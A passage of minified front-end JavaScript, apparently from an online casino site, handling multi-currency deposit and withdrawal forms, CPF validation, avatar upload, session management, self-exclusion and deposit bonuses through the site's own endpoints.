                stNotTg = 3, changeCNot()
            } else {
                if (4 == stNotTg) return void changeCNot(1);
                stNotTg = 4, changeCNot()
            }
    }, checkTRYBa = (e, t = "") => {
        let s;
        if (e = e.value.split("&&"), s = document.getElementById("try_hesap_nu" + t), s.classList.remove("err756"), s.value = e[0], "" == t) {
            s.dataset.u = e[4], s = document.getElementById("try_hesap_sa"), s.value = e[1];
            let t = document.getElementById("mwd_fiat_3");
            t.innerHTML = e[3] + " " + setPaysCurrency, t = document.getElementById("mwd_fiat_8"), t.innerHTML = e[3] + " " + setPaysCurrency, 0 == Number(e[2]) && (e[2] = 1e5), t = document.getElementById("mwd_fiat_4"), t.innerHTML = e[2] + " " + setPaysCurrency, t = document.getElementById("mwd_fiat_7"), t.innerHTML = e[2] + " " + setPaysCurrency, t = document.getElementById("amountFiatDep"), t.dataset.count = e[3], t.dataset.countMax = e[2], chInpD56(document.getElementById("amountFiatDep"))
        }
    }, gD = e => document.getElementById(e), gC = e => document.getElementsByClassName(e), TRYBanks = async (e, t = "") => {
        "BANK TRANSFER" == e && (e = "TRANSFER");
        let s = new FormData;
        s.set("method", e);
        let a = document.getElementById("coins_preloadOpen");
        a.style.display = "flex", document.getElementById("try_hesap_sa").value = "", document.getElementById("try_hesap_nu" + t).value = "";
        let n = "" == t ? "index" : "func",
            r = await axios({
                method: "post",
                url: `/deposit/scash/${n}.php`,
                data: s,
                headers: {
                    "Content-Type": "multipart/form-data"
                }
            }).catch((function(e) {
                return createNotifyL(1, e.message, lp.Error), 1
            }));
        if (r = r.data, 0 == r.error) {
            a.style.display = "";
            let s = "" == t ? "img_dep_f77" : "img_wit_f77";
            s = document.getElementById(s), s.dataset.m = e, s.dataset.t = r.token;
            let n = 1;
            1 == r.data.length && (n = 2);
            let o = 1 == n ? '<option default value="&&&&--&&--">Select</option>' : "";
            return s = document.getElementById("try_hesap_ti" + t), r.data.forEach((e => {
                let s = 1 == n ? "" : "default";
                0 == Number(e.maxPayment) && (e.maxPayment = 1e5), e.maxPayment = Number(e.maxPayment).toFixed(2), e.minPayment = Number(e.minPayment).toFixed(2);
                let a = "" == t ? `${e.bankName} - ${e.minPayment} ${setPaysCurrency} / ${e.maxPayment} ${setPaysCurrency}` : `${e.bankName}`,
                    r = "" == t ? `${e.bankIban}&&${e.accountOwner}&&${e.maxPayment}&&${e.minPayment}&&${e.bankAccountId}` : `${e.bankId}`;
                o += `<option ${s} value="${r}">${a}</option>`, r = {
                    value: r
                }, 2 == n && checkTRYBa(r, t)
            })), s.innerHTML = o, 0
        }
        return createNotifyL(1, r.message, lp.Error), 1
    };
var img_c = null;
let opAvLoad = e => {
    let t = document.getElementsByClassName("avat_load")[0];
    if (e.classList.contains("act") ? (e.classList.remove("act"), t.style.display = "none", img_c && img_c.destroy(), img_c && (img_c = null), window.parseFile({
            name: ""
        })) : (e.classList.add("act"), t.style.display = "block", document.getElementsByClassName("modal_settings")[0].getElementsByClassName("modal_coins_content_inner ")[0].scrollTop = 600), !is_avatsOp) {
        let e = document.getElementById("coins_preloadOpen");
        e.style.display = "flex";
        let t = document.getElementsByTagName("head")[0],
            s = document.createElement("script");
        s.src = "/assets/imagecrop.min.js?x=88888999", s.defer = 1, t.appendChild(s), s.onload = () => {
            e.style.display = "", ekUpload()
        }
    }
};

function ekUpload() {
    let e;
    is_avatsOp = 1, window.onUpdateHandler = function() {
        t()
    };
    var t = function() {
            gD("file-image").src = img_c.crop("image/jpeg", 1), e = img_c.crop("image/jpeg", 1);
            let t = atob(gD("file-image").src.split(",")[1]).length / 1e3;
            gD("wiad244").innerHTML = Number(t).toFixed(2)
        },
        s = gD("file-upload"),
        a = gD("file-drag"),
        n = gD("f-up-b3");

    function r(e) {
        var t = gD("file-drag");
        e.stopPropagation(), e.preventDefault(), t.className = "dragover" === e.type ? "hover" : "modal-body file-upload"
    }

    function o(e) {
        var t = e.target.files || e.dataTransfer.files;
        if (r(e), 0 != t.length) {
            let e = t[0];
            img_c && img_c.destroy(), img_c && (img_c = null), e && parseFile(e), e && function(e) {
                img_c = new ImageCropper(".test-imagecrop", URL.createObjectURL(e), {
                    update_cb: window.onUpdateHandler,
                    mode: "circular",
                    fixed_size: !0,
                    max_width: 300
                })
            }(e)
        }
    }

    function i(e) {
        var t = gD("file-progress");
        e.lengthComputable && (t.value = e.loaded)
    }
    s.addEventListener("change", o, !1), n.addEventListener("click", (function(e) {
        e.stopPropagation(), e.preventDefault(), e.disabled = !0, sendcaptch11(4)
    }), !1), a.addEventListener("dragover", r, !1), a.addEventListener("dragleave", r, !1), a.addEventListener("drop", o, !1), window.parseFile = e => {
        let t = e => document.getElementById(e);
        t("curreNameAv23").innerHTML = e.name, t("userNameSe11").innerHTML = "<strong>" + userSiteNick + "</strong>";
        var s = e.name,
            a = /\.(?=webp|jpg|png|jpeg)/gi.test(s);
        let n = ["start", "start_load23", "notimage"],
            r = ["previeT789", "f-up-b3", "previeTiT", "previe789", "file-image"];
        cl = "hidden", a ? (n.forEach((e => t(e).classList.add(cl))), r.forEach((e => t(e).classList.remove(cl))), t("file-drag").classList.remove("load23"), t("file-image").src = URL.createObjectURL(e), document.getElementsByClassName("modal_settings")[0].getElementsByClassName("modal_coins_content_inner ")[0].scrollTop = 600) : (r.forEach((e => t(e).classList.add(cl))), n.forEach((e => t(e).classList.remove(cl))), t("response").classList.add("hidden"), t("file-drag").classList.add("load23"), t("file-upload-form").reset(), t("file-progress").value = 0)
    }, window.uploadFile = async t => {
        let s = e.split(","),
            a = s[0],
            n = s[1];
        a = a.split(";")[0].split(":")[1];
        let r = function(e, t, s) {
            t = t || "", s = s || 512;
            for (var a = atob(e), n = [], r = 0; r < a.length; r += s) {
                for (var o = a.slice(r, r + s), i = new Array(o.length), l = 0; l < o.length; l++) i[l] = o.charCodeAt(l);
                var c = new Uint8Array(i);
                n.push(c)
            }
            return new Blob(n, {
                type: t
            })
        }(n, a);
        r.name = "image.jpeg", r.lastModified = new Date, r = new File([r], "image", {
            type: r.type
        });
        var o = gD("file-progress");
        if (gD("response").classList.remove("hidden"), r.size <= 2097152) {
            o.style.display = "inline", t.set("upload", "1"), t.append("image", r);
            let e = await axios({
                method: "post",
                url: "/user/upload.php",
                data: t,
                headers: {
                    "Content-Type": "multipart/form-data"
                },
                onUploadProgress: i,
                onDownloadProgress: i
            }).catch((function(e) {
                createNotifyL(1, e.message, lp.Error)
            }));
            if (e = e.data, gD("f-up-b3").disabled = !1, 0 == e.error) {
                createNotifyL(2, "", lp.Success);
                let t = document.getElementsByClassName("addavat")[0];
                opAvLoad(t);
                let s = gD("ya7893");
                userAvatarI = 0, timeAvatars = Date.now(), userAvatarUrl = "/user_thumb/" + e.file + "?x=" + timeAvatars, setAvatarUser(), s ? (s.classList.add("active"), s.setAttribute("src", userAvatarUrl)) : createAvs(e.file), window.socketChatJG && window.socketChatJG.emit("changeAvatar", userAvatarI)
            } else createNotifyL(1, e.text, lp.Error)
        } else createNotifyL(1, "Please upload a smaller file (< 2048 KB).", lp.Error)
    }
}
let createAvs = e => {
    if (!document.getElementById("ya7893")) {
        let t = document.getElementsByClassName("addavat")[0],
            s = t.parentNode.getElementsByClassName("active")[0];
        s && s.classList.remove("active"), s = document.createElement("img"), s.setAttribute("width", "64"), s.setAttribute("height", "64"), s.setAttribute("id", "ya7893"), s.onclick = () => {
            changeAv(0)
        }, 0 == userAvatarI && s.classList.add("active"), s.classList.add("avatar0"), userAvatarUrl = "/user_thumb/" + e + "?x=" + timeAvatars, s.setAttribute("src", userAvatarUrl), t.after(s), setAvatarUser()
    }
};
const currencyAbbreviations = {
    NZD: "$",
    AUD: "$",
    USD: "$",
    CNY: "¥",
    RUB: "₽",
    PEN: "S/",
    UZS: "сўм",
    GEL: "₾",
    CLP: "$",
    UAH: "₴",
    JET: "₺",
    BRL: "R$",
    KZT: "₸",
    BDT: "৳",
    KES: "Ksh",
    AZN: "₼",
    NGN: "₦",
    CAD: "$",
    EUR: "€",
    TRY: "₺",
    IDR: "Rp",
    INR: "₹",
    PHP: "₱",
    THB: "฿",
    JPY: "¥",
    VND: "₫",
    MYR: "RM"
};
let bonSet, globalTours, countEls55, casinoGames, uProvCoins, wheelTis, opDData = async (e, t = !1, s = 0) => {
    let a = document.getElementsByClassName("dd_bl_c" + Number(e))[0];
    if (a.style.display = "block", a = a.getElementsByClassName("err756"), Array.from(a).forEach((e => {
            e.classList.remove("err756")
        })), a = document.getElementsByClassName("dd_bl_c" + Number(!e))[0], a.style.display = "none", a = document.getElementsByClassName("opListCur1")[0], a.style.display = "block", isMobile()) {
        document.getElementsByClassName("modal_deposite")[0].classList.add("opMon2")
    }
    if (1 == e) {
        document.getElementsByClassName("modal_deposite")[0].classList.add("opMon3")
    }
    if (!e) {
        let e = document.getElementsByClassName("modal_deposite")[0];
        e.classList.remove("opMon2"), e.classList.remove("opMon3")
    }
    if (t) {
        a = gC("amountAbbr1")[0], a && (a.innerHTML = currencyAbbreviations[setPaysCurrency]), a = document.getElementsByClassName("opListCur1")[0], a.style.display = "none";
        let e = document.getElementById("img_dep_f77"),
            s = t.getElementsByTagName("img")[0],
            n = s.getAttribute("alt");
        n = chFDV7(n, 2);
        let r = document.getElementsByClassName("extra_parFFF");
        if (Array.from(r).forEach((e => e.style.display = "none")), "USD" == setPaysCurrency || "PEN" == setPaysCurrency || "CLP" == setPaysCurrency || "BDT" == setPaysCurrency) {
            depwith[setPaysCurrency].in = [s.dataset.min, s.dataset.max];
            let e = document.getElementById("amountFiatDep");
            e.dataset.count = depwith[setPaysCurrency].in[0], e.dataset.countMax = depwith[setPaysCurrency].in[1]
        }
        let o = depwith[setPaysCurrency];
        o = o ? o.in : ["--", "--"];
        let i = document.getElementById("mwd_fiat_8");
        if (i.innerHTML = o[0] + " " + setPaysCurrency, i = document.getElementById("mwd_fiat_7"), i.innerHTML = o[1] + " " + setPaysCurrency, "TRY" == setPaysCurrency && (o = ["--", "--"]), i = document.getElementById("mwd_fiat_3"), i.innerHTML = o[0] + " " + setPaysCurrency, i = document.getElementById("mwd_fiat_4"), i.innerHTML = o[1] + " " + setPaysCurrency, "AZN" == setPaysCurrency && (r = document.getElementsByClassName("extra_par_AZN")[0], r && "eex" != s.dataset.a && (r.style.display = "block")), "BDT" == setPaysCurrency && (r = document.getElementsByClassName("extra_par_BDT")[0], r && "P2P" != s.dataset.a && (r.style.display = "block")), "NGN" == setPaysCurrency && "Card" == n && (r = document.getElementsByClassName("extra_par_NGN_card")[0], r && (r.style.display = "block"), setFLname(0, 0, "ngn_c_email")), "RUB" == setPaysCurrency && (r = document.getElementsByClassName("extra_par_RUB"), "visamc_p2p" == s.dataset.a || (r = r[1]), r && (r.style.display = "block"), "aifo" == s.dataset.a && r && (r.style.display = "none")), "USD" == setPaysCurrency && (r = document.getElementsByClassName("extra_par_USD")[0], r && (r.style.display = "block")), "PEN" == setPaysCurrency && (r = document.getElementsByClassName("extra_par_PEN")[0], r && (r.style.display = "block")), "CLP" == setPaysCurrency && ("Cash" == s.dataset.a || "Wallet" == s.dataset.a ? (r = gC("extra_par_CLP")[0], r && (r.style.display = "block"), setFLname("clp_fname1", "clp_lname1", 0, "clp_p_card"), "Wallet" == s.dataset.a ? (gC("clp_ph23")[0].style.display = "none", gC("clp_ch23")[0].style.display = "block") : (gC("clp_ph23")[0].style.display = "block", gC("clp_ch23")[0].style.display = "none")) : (r = gC("extra_par_CLPp")[0], r && (r.style.display = "block"), setFLname(0, 0, "clp_e_m"))), "BRL" == setPaysCurrency && "PIX" == n && "1" != s.dataset.a && (r = document.getElementsByClassName("extra_par_BRL")[0], r && (r.style.display = "block"), r = document.getElementsByClassName("pix_main_info")[0], r && (r.style.display = "block"), r = document.getElementsByClassName("pix_main_img")[0], r && (r.style.display = "none"), user_creds && user_creds.d && user_creds.d.pix && user_creds.d.pix.number && (gD("pix_document_id1").value = user_creds.d.pix.number, checkCPFPIX(gD("pix_document_id1"))), setFLname("pix_fname1", "pix_lname1")), "PHP" == setPaysCurrency && (r = gC("extra_par_PHP")[0], r && (r.style.display = "block"), setFLname("php_fname1", "php_lname1")), "CAD" == setPaysCurrency && (r = document.getElementsByClassName("extra_par_CAD")[0], r && (r.style.display = "block"), setFLname(0, 0, 0, "cad_phone_extr")), r = document.getElementsByClassName("fiat_dep_m4")[0], r && (r.style.display = "block"), "ALL" == setPaysCurrency && (r.style.display = "none", gC("extra_par_ALL")[0].style.display = "block"), e.setAttribute("alt", n), e.dataset.a = s.dataset.a, e.dataset.b = s.dataset.b, e.setAttribute("src", s.getAttribute("src")), e = document.getElementById("mwd_fiat1"), e.innerHTML = n, "TRY" == setPaysCurrency && !s.dataset.a)
            if (setFLname("try_nameF", "try_surnameF"), r = document.getElementsByClassName("extra_par_TRY"), "VISA/MASTERCARD" != n) {
                if (1 == await TRYBanks(n)) return;
                document.getElementsByClassName("try_seld2")[0].style.display = "block", r[0].style.display = "block", r[1].style.display = "block", r[3].style.display = "block"
            } else {
                let e = document.getElementById("img_dep_f77");
                e.dataset.m = "CREDITCARD", e.dataset.t = 1, r[0].style.display = "block", r[2].style.display = "block", document.getElementsByClassName("try_seld1")[0].style.display = "block"
            }
    }
    exrPageDep = s, clearInterval(depRset)
}, opWData = async (e, t = !1) => {
    "CAD" == setPaysCurrency && setFLname("cad_name", "cad_surname", "cad_w_email", "cad_w_phone");
    let s = document.getElementsByClassName("dw_bl_c" + Number(e))[0];
    if (s.style.display = "block", s = s.getElementsByClassName("err756"), Array.from(s).forEach((e => {
            e.classList.remove("err756")
        })), s = document.getElementsByClassName("dw_bl_c" + Number(!e))[0], s.style.display = "none", s = document.getElementsByClassName("opListCur2")[0], s.style.display = "block", isMobile()) {
        document.getElementsByClassName("modal_deposite")[0].classList.add("opMon2")
    }
    if (!e) {
        document.getElementsByClassName("modal_deposite")[0].classList.remove("opMon2")
    }
    if (t) {
        s = document.getElementsByClassName("opListCur2")[0], s.style.display = "none";
        let e = document.getElementById("img_wit_f77"),
            a = t.getElementsByTagName("img")[0],
            n = a.getAttribute("alt");
        if (n = chFDV7(n, 2), "RUB" == setPaysCurrency) {
            let e = document.getElementsByClassName("rrrbb2")[0];
            "2" == a.dataset.a || "aifo" == a.dataset.a ? e.style.display = "none" : e.style.display = ""
        }
        if ("AZN" == setPaysCurrency) {
            let e = t.getElementsByTagName("img")[0],
                s = gC("list_wf_AZN")[0];
            s && (s = s.getElementsByClassName("input-block")), "eex" == e.dataset.a ? (s[0].style.display = "none", s[1].style.display = "block", setFLname(0, 0, 0, "azn_p_card")) : (s[1].style.display = "none", s[0].style.display = "block")
        }
        if (gD("spanCr2_i28").setAttribute("src", "/assets/coins/" + setPaysCurrency + ".svg"), gD("cur_wds9").innerHTML = window.truncatorJet(Number(listCurs.data.rates[setPaysCurrency]), 2, 2) + " ", gD("cur_curs_wd9").innerHTML = setPaysCurrency, gD("lci_wd9").innerHTML = "1.00 ", "INR" == setPaysCurrency) {
            let e = document.getElementsByClassName("rfha34")[0];
            e.style.display = "none", e = document.getElementsByClassName("rfha42")[0], e.style.display = "Imps" == n ? "block" : "none", e = document.getElementsByClassName("rfha35")[0], e.style.display = "PayTM" == n ? "block" : "none";
            let t = document.getElementsByClassName("with_min117F")[0],
                s = [5e3, 4e4];
            "Imps" == n && (s[0] = 1e3, s[1] = 5e4), t.dataset.count = s[0], t.dataset.countMax = s[1], t.innerHTML = s[0] + " " + setPaysCurrency, t = document.getElementById("mwd_fiat_6"), t.innerHTML = s[1] + " " + setPaysCurrency, setFLname(0, 0, 0, "inr_c_accnumb")
        }
        if (e.setAttribute("alt", n), e.setAttribute("src", a.getAttribute("src")), e.dataset.a = a.dataset.a, e.dataset.b = a.dataset.b, e = document.getElementById("mwd_fiat2"), e.innerHTML = n, "NGN" == setPaysCurrency) {
            let e = document.getElementById("ngn_w_baco");
            if ("" == e.innerHTML) {
                let t = await axios.get("/deposit/niger/ngn-banks.json?x=3"),
                    s = '<option default value="">Select</option>';
                t.data.banks.forEach((e => {
                    s += `<option value="${e.bank_name}&&${e.bank_code}">${e.bank_name} (Code: ${e.bank_code})</option>`
                })), e.innerHTML = s
            }
        }
        if ("BDT" == setPaysCurrency && ("bkash" == a.dataset.b || "P2P" != a.dataset.a ? gC("bdt_e345")[0].style.display = "block" : gC("bdt_e345")[0].style.display = "none", setFLname(!1, !1, "bdt_c_email")), "BRL" == setPaysCurrency) {
            let e = "";
            user_creds && user_creds.w && user_creds.w.pix && user_creds.w.pix.document_id && (e = user_creds.w.pix.document_id), user_creds && user_creds.d && user_creds.d.pix && user_creds.d.pix.number && (e = user_creds.d.pix.number), gD("pix_document_id").value = e, user_creds && user_creds.w && user_creds.w.pix && user_creds.w.pix.document_type && (gD("pix_document_type").innerHTML = user_creds.w.pix.document_type, gD("pix_document_type").dataset.a = user_creds.w.pix.document_type), setFLname(!1, !1, !1, !1, "pix_name")
        }
        if ("CLP" == setPaysCurrency) {
            setFLname(0, 0, "clp_email", "clp_phone");
            let e = gC("sel_payco24"),
                t = "none";
            "payku" != a.dataset.a && (t = "block"), Array.from(e).forEach((e => e.style.display = t))
        }
        if ("TRY" == setPaysCurrency) {
            "BANK TRANSFER" == n && (n = "TRANSFER");
            let e = document.getElementsByClassName("try_with_ban")[0],
                t = document.getElementsByClassName("try_with_ano")[0];
            if ("EFTFAST" == n || "TRANSFER" == n) {
                if (1 == await TRYBanks(n, 2)) return;
                e.style.display = "block", t.style.display = "none"
            } else t.style.display = "block", e.style.display = "none";
            "TRY" == setPaysCurrency && setFLname("try_name", "try_surname")
        }
        if ("IDR" == setPaysCurrency) {
            let e = gC("list_wf_IDR")[0];
            e = e.getElementsByClassName("flex")[1], a.dataset.a ? e.style.display = "flex" : e.style.display = "none", setFLname("fn_w_idr", "ln_w_idr")
        }
        if ("PHP" == setPaysCurrency) {
            let e = gC("list_wf_PHP")[0];
            e = e.getElementsByClassName("input-block"), "GCASH" == n ? (e[1].style.display = "block", e[2].style.display = "none") : (e[2].style.display = "block", e[1].style.display = "none")
        }
    }
}, setFLname = (e, t, s, a, n) => {
    e && objUserInfo.fname && (gD(e).value = objUserInfo.fname), t && objUserInfo.lname && (gD(t).value = objUserInfo.lname), s && objUserInfo.email && (gD(s).value = objUserInfo.email), a && objUserInfo.phonecode && objUserInfo.phone && (gD(a).value = objUserInfo.phonecode + objUserInfo.phone), n && objUserInfo.fname && objUserInfo.lname && (gD(n).value = objUserInfo.lname + " " + objUserInfo.fname)
}, checkCPFPIX = e => {
    e.value = e.value.replaceAll(".", "").replaceAll("_", "").replaceAll("-", "");
    let t = e.dataset.count,
        s = e.value.length;
    t = Number(t), s > 3 && s <= 6 && (t <= s || 3 != t) && (e.value = e.value.replace(/(\d{3})/, "$1.")), s > 6 && s <= 9 && (t < s || 6 != t) && (e.value = e.value.replace(/(\d{3})(\d{3})/, "$1.$2.")), s > 9 && (t < s || 9 != t) && (e.value = e.value.replace(/(\d{3})(\d{3})(\d{3})/, "$1.$2.$3-")), e.dataset.count = s, s = e.value.length, s < 14 && (e.value = e.value + e.placeholder.substring(s));
    let a = -1,
        n = e.value.indexOf("_");
    if (a > n && -1 != n && (a = n), n = e.value.indexOf("."), a > n && -1 != n && (a = n), n = e.value.indexOf("-"), a > n && -1 != n && (a = n), -1 == a && (a = s), e.setSelectionRange(a, a), e.value = e.value.slice(0, 14), s > 13) {
        chCPFPIX(e.value) ? e.classList.remove("input_invalid") : e.classList.add("input_invalid")
    }
}, chCPFPIX = e => {
    let t = !1;
    if (14 !== e.length && 11 !== e.length) return t;
    14 === e.length && (e = (e = (e = e.replace(".", "")).replace(".", "")).replace("-", ""));
    let s = 0,
        a = 0;
    if ("00000000000" === e) return t;
    for (let t = 1; t <= 9; ++t) s += parseInt(e.substring(t - 1, t)) * (11 - t);
    return a = 10 * s % 11, 10 != a && 11 != a || (a = 0), a != parseInt(e.substring(9, 10)) || (t = !0), t
}, changeCNot = e => {
    let t = 3 == stNotTg;
    1 == e && (t = !t), t ? (0 != countMesS && notifClick("s"), countMesS = 0, changeCountNot(4), addClassNot("s", 3)) : (0 != countMesP && notifClick("p"), countMesP = 0, changeCountNot(3), addClassNot("p", 3)), countMesNot = countMesS + countMesP, changeCountNot(2)
}, openStatic = async () => {
    if (1 != window.user_il) return void openMobileLogin();
    await modalOpenNew("modal_static", "statistic"), setAvatarUser(), document.getElementsByClassName("modal_static")[0].classList.add("active"), await getUserStatInfo(2), getStatUser(), errFixCoins(), openHistory("?" + window.location.href.split("?")[1] + "&statistics", 1)
}, closeTasks = () => {
    let e = gC("modal_tasks")[0];
    e && e.classList.remove("active"), closeHistory("&tasks"), errUnFixCoins()
}, getTask = async (e, t, s) => {
    e.disabled = !0;
    let a = new FormData;
    a.set("action", "userGetMoneyTask"), a.set("taskUser", t);
    let n = await axios({
        method: "post",
        url: "/user/func.php",
        data: a,
        headers: {
            "Content-Type": "multipart/form-data"
        }
    }).catch((function(t) {
        createNotifyL(1, t.message, lp.Error), e.disabled = !1
    }));
    if (0 == n.data.error) {
        let t = gD("tasks_am2").innerHTML;
        t = Number(t) + s, t = window.truncatorJet(t, 2, 2), gD("tasks_am2").innerHTML = t, createNotifyL(2, "", lp.Success), e.innerHTML = '<div class="button-inner">Received</div>'
    } else e.disabled = !1, createNotifyL(1, n.data.message, lp.Error)
}, selfExc = e => {
    e.disabled = !0, Swal.fire({
        title: "Are you sure self-exclusion?",
        text: lp["With this action you confirm this operation"],
        icon: "question",
        showCancelButton: !0,
        confirmButtonColor: "#3085d6",
        cancelButtonColor: "#d33",
        cancelButtonText: lp.No,
        confirmButtonText: lp.Yes
    }).then((async t => {
        if (t.isConfirmed) {
            let t = new FormData;
            t.set("action", "userClickSelfExclusion");
            let s = await axios({
                method: "post",
                url: "/user/func.php",
                data: t,
                headers: {
                    "Content-Type": "multipart/form-data"
                }
            }).catch((function(t) {
                createNotifyL(1, t.message, lp.Error), e.disabled = !1
            }));
            e.disabled = !1, 0 == s.data.error ? createNotifyL(2, s.data.message, lp.Success) : createNotifyL(1, s.data.message, lp.Error)
        } else e.disabled = !1
    }))
}, openTasks = async () => {
    if (1 != window.user_il) return void openMobileLogin();
    await modalOpenNew("modal_tasks", "tasks");
    let e = new FormData;
    e.set("action", "getUserTasks");
    let t = await axios({
        method: "post",
        url: "/user/func.php",
        data: e,
        headers: {
            "Content-Type": "multipart/form-data"
        }
    }).catch((function(e) {
        createNotifyL(1, e.message, lp.Error)
    }));
    t = t.data;
    let s, a = gD("tasks_am2"),
        n = {
            fa: .1,
            em: .25,
            ph: .25,
            av: .1
        },
        r = 0;
    t = Object.entries(t), t.forEach((e => {
        s = gC("tasks_i9" + e[0])[0], s && (1 == e[1] && s.classList.add("get244"), 2 == e[1] && (s.classList.add("get244"), s.classList.add("get233"), s = s.getElementsByTagName("button"), s[1].disabled = !0, s[1].innerHTML = '<div class="button-inner">Received</div>', r += n[e[0]]))
    })), a.innerHTML = window.truncatorJet(r, 2, 2), s = gC("modal_tasks")[0], s.classList.add("active"), errFixCoins(), openHistory("?" + window.location.href.split("?")[1] + "&tasks", 1)
}, closeSesM = () => {
    gC("modal_sesM")[0].classList.remove("active")
}, sendDelCook = async (e, t) => {
    e.disabled = !0;
    let s = new FormData;
    s.set("action", "deleteUserSessions"), s.set("id", t), await axios({
        method: "post",
        url: "/user/func.php",
        data: s,
        headers: {
            "Content-Type": "multipart/form-data"
        }
    }).catch((function(e) {
        createNotifyL(1, e.message, lp.Error)
    })), e.outerHTML = "Removed"
}, openSesM = async () => {
    if (1 != window.user_il) return void openMobileLogin();
    await modalOpenNew("modal_sesM", "session"), gC("modal_sesM")[0].classList.add("active");
    let e = new FormData;
    e.set("action", "getAllUserSessions");
    let t = await axios({
        method: "post",
        url: "/user/func.php",
        data: e,
        headers: {
            "Content-Type": "multipart/form-data"
        }
    });
    gC("sesL_bets1")[0].innerHTML = "";
    let s = "";
    t.data.forEach((e => {
        let t = "Removed",
            a = " - ";
        e.country && (a = e.country), 1 == e.curr && (t = '<span style="color:#fff">Current</span>'), 1 == e.status && 0 == e.curr && (t = `<a onclick="sendDelCook(this,'${e.id}')">\n    Terminate\n    </a>`), e.btn = t, s += `\n    <div class="tr">\n    <div class="td">\n    <span>Browser</span>\n    ${e.browser}\n    </div>\n    <div class="td">\n    <span>IP</span>\n    ${e.ip}\n    </div>\n    <div class="td">\n    <span>Country</span>\n    ${a}\n    </div>\n    <div class="td">\n    <span>Time</span>\n    ${e.time}\n    </div>\n    <div class="td">\n    <span>Status</span>\n    ${e.btn}\n    </div>\n    </div>\n    `
    })), gC("sesL_bets1")[0].innerHTML = s, errFixCoins()
}, openPromoinfo = async e => {
    await modalOpenNew("modal_promoInfo", "promoinfo");
    let t = gC("prto107");
    Array.from(t).forEach((e => e.style.display = "none")), t = gC("prfo_" + e)[0], t.style.display = "block", t = gC("prto_" + e)[0], t.style.display = "block", t = gC("modal_promoInfo")[0], t.classList.add("active"), errFixCoins()
}, closePromoinfo = () => {
    gC("modal_promoInfo")[0].classList.remove("active"), errUnFixCoins()
}, closeDet44 = async (e = 2) => {
    let t, s = "modal_det44";
    if (1 == e) {
        let e = gD("coins_preloadOpen");
        e.style.display = "flex";
        let a, n = new FormData;
        n.set("action", "userChangeBonusDeposit"), 0 == chBoI.id && (chBoI.id = ""), n.set("key", chBoI.id), await axios({
            method: "post",
            url: "/user/func.php",
            data: n,
            headers: {
                "Content-Type": "multipart/form-data"
            }
        }).catch((function(t) {
            e.style.display = "none", createNotifyL(1, t.message, lp.Error)
        })), e.style.display = "none", s = "modal_det55", t = gC("modal_deposite")[0], createBtnPays(), t && t.classList.add("active"), t = gC("tolET"), Array.from(t).forEach((e => {
            a = e.getElementsByTagName("div"), a[0].innerHTML = chBoI.name;
            let t = a[1].getElementsByTagName("span")[0];
            t.innerHTML = chBoI.am, t = a[2].getElementsByTagName("span")[0], t.innerHTML = "$" + chBoI.min
        }))
    }
    t = gC(s)[0], t && t.classList.remove("active")
}, openDet44 = async (e = 2) => {
    let t, s = "modal_det44";
    if (1 == e) {
        t = gC("modal_deposite")[0], t.classList.remove("active");
        let e, a, n, r = gD("coins_preloadOpen");
        r.style.display = "flex", chBoI = {
            min: 0,
            id: 0,
            am: 0,
            amo: 0,
            name: ""
        };
        let o = new FormData;
        if (o.set("action", "getUserBonusDeposit"), n = await axios({
                method: "post",
                url: "/user/func.php",
                data: o,
                headers: {
                    "Content-Type": "multipart/form-data"
                }
            }).catch((function(e) {
                t.classList.add("active"), r.style.display = "", createNotifyL(1, e.message, lp.Error)
            })), n = n.data, 0 != n.error) return createNotifyL(1, "", lp.Error), void(r.style.display = "");
        n = JSON.parse(n.bonus);
        let i = n.c;
        if (delete n.c, n = Object.entries(n), r.style.display = "", 0 == n.length) return t = gC("modal_deposite")[0], void t.classList.add("active");
        s = "modal_det55", t = gC("bonTerms3532")[0], t.style.display = "none", t = gC("dep_bon_it"), t = Array.from(t), t[0].classList.add("active"), t.shift(), t[0].classList.remove("active"), n.forEach((s => {
            e = t[0].cloneNode(!0), a = "$" + Number(s[1].m).toFixed(2), e.dataset.min = a, a = "", e.dataset.amo = 0, e.dataset.am = 0, null != s[1].p && (a = s[1].p + "%", e.dataset.amo = s[1].p), null != s[1].p && null != s[1].f && (a += " + "), null != s[1].f && (a += s[1].f + " FS");
            let n = {
                1: "First",
                2: "Second",
                3: "Third",
                4: "Fourth"
            };
            n = n[s[1].n] ? n[s[1].n] : s[1].n, e.dataset.am = a, a = n + " deposit bonus", e.dataset.name = a, e.getElementsByClassName("bon_pr1")[0].innerHTML = a, e.onclick = e => {
                chBonDep(e.currentTarget, s[0])
            }, t[0].parentNode.appendChild(e), i == s[0] && e.click()
        })), t.forEach((e => {
            e.outerHTML = ""
        })), t = gC("amountFiatDep456")[0], t && (t.value = ""), t = gD("amountFiatExt"), t && (t.style.display = "none"), t = gC("amountFiatET"), t[0] && (t[0].style.display = "none"), t[1] && (t[1].style.display = "none")
    }
    t = gC(s)[0], t && t.classList.add("active")
}, chCurExt = (e, t = 1) => {
    let s = document.getElementsByClassName("cur_img_44")[0];
    if (s.setAttribute("src", `/assets/coins/${e}.svg`), s = document.getElementsByClassName("cur_ex_text")[0], s.innerHTML = e, t) {
        let s = document.getElementsByClassName("balance_cur_" + e)[0];
        if (s) chaBal({
            currentTarget: s
        }, 7);
        else {
            let t = arrayCurrencyFiat.findIndex((t => t[0] == e)),
                a = document.getElementsByClassName("balance_tg_wr")[0]; - 1 == t ? (a = a.getElementsByClassName("t_m_c113")[0], curCCH(0, a)) : (a = a.getElementsByClassName("t_m_c113")[1], curCCH(1, a)), s = document.getElementsByClassName("balance_cur_" + e)[0], s && chaBal({
                currentTarget: s
            }, 7)
        }
        2 != t && opeLngBlock(3)
    }
}, openExtraReg = async () => {
    await modalOpenNew("modal_extraReg", "extraReg");
    let e = document.getElementsByClassName("modal_extraReg")[0],
        t = "";
    arrayCurrencyR.concat(arrayCurrencyFiat).forEach((e => {
        t += `<div onclick="chCurExt('${e[0]}')" class="select-option">\n      <img class="lng_img_117" src="/assets/coins/${e[0]}.svg">\n      ${e[0]}\n      </div>`
    }));
    let s = arrCountryF[userCountry];
    s || (s = userBetCur), chCurExt(s, 2), changeLanguage(lngGame);
    let a = (new Date).getFullYear() - 18,
        n = "",
        r = document.getElementById("yearUserE");
    for (let e = 0; e < 100; e++) {
        let t = a - e;
        n += `<option value="${t}">${t}</option>`
    }
    r.innerHTML += n, e.classList.add("active"), e = document.getElementsByClassName("sowcf46")[0], e.innerHTML = t, errFixCoins(), s = countryPhoneCodes[userCountry], s && (gD("phonecodeExt").value = s)
}, closeExtraRe = () => {
